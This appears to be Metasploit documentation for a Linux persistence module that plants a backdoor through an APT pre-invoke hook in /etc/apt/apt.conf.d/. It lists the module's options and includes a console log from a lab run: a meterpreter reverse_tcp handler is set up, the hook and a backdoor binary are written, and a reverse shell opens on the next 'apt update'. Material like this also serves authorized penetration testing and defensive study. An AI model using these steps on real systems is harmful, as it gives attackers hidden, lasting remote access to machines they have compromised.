## Description

This module will run a payload when the package manager is used. No
handler is ran automatically so you must configure an appropriate
exploit/multi/handler to connect. This module creates a pre-invoke hook
for APT in apt.conf.d. The hook name syntax is numeric followed by text.

## Verification Steps

1. Exploit a box that uses APT
2. `use linux/local/apt_package_manager_persistence`
3. `set SESSION <id>`
4. `set PAYLOAD cmd/unix/reverse_python` configure the payload as needed
5. `exploit`

When the system runs apt-get update the payload will launch.  You must set handler accordingly.

## Options

**BACKDOOR_NAME**

Name of backdoor executable

**HOOKNAME**

Name of pre-invoke hook to be installed in /etc/apt/apt.conf.d/. Pre-invoke hook name syntax is numeric followed by text.

**WritableDir**

Writable directory for backdoor default is (/usr/local/bin/)

## Scenarios

### Tested on Ubuntu 18.04.2 LTS

```
msf5 > use exploit/linux/local/apt_package_manager_persistence
msf5 exploit(linux/local/apt_package_manager_persistence) > handler -p linux/x86/meterpreter/reverse_tcp -H 172.22.222.136 -P 4444
[*] Payload handler running as background job 0.
msf5 exploit(linux/local/apt_package_manager_persistence) > 
[*] Started reverse TCP handler on 172.22.222.136:4444 
[*] Sending stage (985320 bytes) to 172.22.222.130
[*] Meterpreter session 1 opened (172.22.222.136:4444 -> 172.22.222.130:60526) at 2019-04-26 13:04:33 -0500

msf5 exploit(linux/local/apt_package_manager_persistence) > set session 1
session => 1
msf5 exploit(linux/local/apt_package_manager_persistence) > set payload linux/x86/meterpreter/reverse_tcp 
payload => linux/x86/meterpreter/reverse_tcp
msf5 exploit(linux/local/apt_package_manager_persistence) > set lhost 172.22.222.136 
lhost => 172.22.222.136
msf5 exploit(linux/local/apt_package_manager_persistence) > set lport 4444
lport => 4444
msf5 exploit(linux/local/apt_package_manager_persistence) > exploit

[*] Attempting to write hook:
[*] Wrote /etc/apt/apt.conf.d/34bmUIzfd
[*] Backdoor uploaded /usr/local/bin/dbmqKeh6U9
[*] Backdoor will run on next APT update
msf5 exploit(linux/local/apt_package_manager_persistence) > 
[*] Sending stage (985320 bytes) to 172.22.222.130
[*] Meterpreter session 2 opened (172.22.222.136:4444 -> 172.22.222.130:60528) at 2019-04-26 13:05:17 -0500

msf5 exploit(linux/local/apt_package_manager_persistence) >
```

Note: Second session comes in after running `apt update` on the remote host
